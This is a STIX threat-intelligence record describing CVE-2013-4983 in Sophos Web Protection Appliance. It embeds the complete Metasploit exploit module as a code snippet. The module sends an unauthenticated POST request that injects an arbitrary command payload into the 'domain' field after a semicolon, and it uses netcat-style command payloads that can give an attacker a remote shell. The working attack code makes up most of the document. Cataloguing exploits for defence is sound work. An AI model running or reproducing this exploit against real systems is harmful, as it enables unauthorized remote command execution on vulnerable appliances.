{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3e3ff751-0600-47c6-a7af-7bdfe49486c2",
    "created": "2024-08-14T17:01:10.479994Z",
    "modified": "2024-08-14T17:01:10.479999Z",
    "name": "Sophos Web Protection Appliance sblistpack Arbitrary Command Execution",
    "description": " This module exploits a command injection vulnerability on Sophos Web Protection Appliance 3.7.9, 3.8.0 and 3.8.1. The vulnerability exists on the sblistpack component, reachable from the web interface without authentication. This module has been tested successfully on Sophos Virtual Web Appliance 3.7.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/sophos_wpa_sblistpack_exec.rb",
            "external_id": "sophos_wpa_sblistpack_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4983"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sophos Web Protection Appliance sblistpack Arbitrary Command Execution',\n      'Description'    => %q{\n        This module exploits a command injection vulnerability on Sophos Web Protection Appliance\n        3.7.9, 3.8.0 and 3.8.1. The vulnerability exists on the sblistpack component, reachable\n        from the web interface without authentication. This module has been tested successfully\n        on Sophos Virtual Web Appliance 3.7.0.\n      },\n      'Author'         =>\n        [\n          'Francisco Falcon', # Vulnerability discovery and PoC\n          'juan vazquez'      # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-4983' ],\n          [ 'OSVDB', '97029' ],\n          [ 'BID', '62263'],\n          [ 'EDB', '28175'],\n          [ 'URL', 'http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities']\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'BadChars'    => \"\\x27\\x22\\x5c\",\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic netcat-e' # Because quotes and double-quotes aren't valid\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Sophos Web Protection Appliance 3.7.0', { }]\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-09-06'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(443)\n      ],\n      self.class\n    )\n\n  end\n\n  def check\n    url = \"http://www.#{rand_text_alpha(10 + rand(10))}.com\"\n    domain = \"http://#{rand_text_alpha(10 + rand(10))}.com\"\n    res = send_exploit_query(url, domain)\n\n    if res and res.code == 302 and res.headers.include?('Location') and res.headers['Location'] =~ /#{url}/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_status(\"#{rhost}:#{rport} - Executing payload...\")\n    url = \"http://www.#{rand_text_alpha(10 + rand(10))}.com\"\n    domain = \"http://#{rand_text_alpha(10 + rand(10))}.com;#{payload.encoded}\"\n    # very short timeout because the request may never return if we're\n    # sending a socket payload\n    send_exploit_query(url, domain, 0.01)\n  end\n\n  def send_exploit_query(url, domain, timeout = 20)\n    user = rand_text_alpha(8 + rand(5))\n    res = send_request_cgi({\n      'uri' => normalize_uri('end-user', 'index.php'),\n      'method' => 'POST',\n      'vars_get' => {\n        'c' =>'blocked',\n        'action' => 'continue'\n      },\n      'vars_post' => {\n        'url'             => \"#{Rex::Text.encode_base64(url)}\",\n        'args_reason'     => rand_text_alpha(15 + rand(5)),\n        'filetype'        => rand_text_alpha(15 + rand(5)),\n        'user'            => user,\n        'user_encoded'    => \"#{Rex::Text.encode_base64(user)}\",\n        'domain'          => domain,\n        'raw_category_id' => \"#{rand_text_alpha(4 + rand(8))}|#{rand_text_alpha(4 + rand(8))}\"\n      }\n    }, timeout)\n\n    return res\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-06",
    "x_mitre_platforms": [
        "['unix']"
    ]
}